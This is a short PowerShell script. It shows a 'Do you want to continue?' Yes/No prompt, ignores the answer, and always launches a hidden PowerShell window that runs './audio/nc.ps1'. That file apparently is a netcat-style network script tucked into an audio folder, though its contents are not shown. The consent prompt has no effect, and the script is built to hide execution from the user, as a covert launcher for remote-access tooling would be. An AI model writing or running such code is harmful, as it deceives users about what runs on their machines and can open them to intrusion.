$choices = @("&Yes", "&No")
$prompt = "Do you want to continue?"

$decision = $host.UI.PromptForChoice("", $prompt, $choices, 0)

Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -Command & './audio/nc.ps1'"
